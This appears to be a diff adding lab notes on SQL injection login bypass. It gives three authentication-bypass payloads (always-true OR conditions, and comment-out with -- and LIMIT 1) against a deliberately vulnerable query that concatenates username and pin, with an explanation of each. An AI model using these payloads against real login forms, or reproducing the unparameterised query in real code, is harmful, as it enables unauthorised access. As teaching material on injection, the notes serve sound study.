@@ -1,0 +1,47 @@
+Example Injecton if you know the username:
+
+User: Spongebob
+Password: 205
+
+**** Injection ****
+User: Spongebob' OR '1'='1
+Password: [Can Be Anything]
+****************************
+
+Explanation:
+This is the SQL Query that checks that the username AND password match; If so it logs in:
+"SELECT * FROM users WHERE username = '$username' AND pin = '$password'"
+
+This query uses an AND statement to check if the username matches the password.
+The injection manipulates the query to include (' OR '1'='1) which is always true.
+So it will check if the passwords match, then move on to the OR statement which will always be true and will grant access.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+Inject by commenting out
+
+User: Patrick
+Password: 307
+
+**** Injection ****
+User: Patrick'-- {NOTE: Include a space after '--'}
+Password: [Can Be Anything]
+****************************
+
+Explanation:
+This type of injection comments out this part of the SQL Query:
+--AND pin = '$password'
+If this part of the query is commented out, then all you need is the username because it does not look for the password.
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+Inject if you do not know the username
+
+**** Injection ****
+User: ' OR 1=1 LIMIT 1 -- {NOTE: Include a space after '--'}
+Password: [Can Be Anything]
+****************************
+
+Explanation:
+The condition 1=1 is always true, so it returns the first user in the database.
+LIMIT 1 ensures only one user is returned, preventing potential errors.
+The -- comments out the password check, meaning no password is required.
+
+
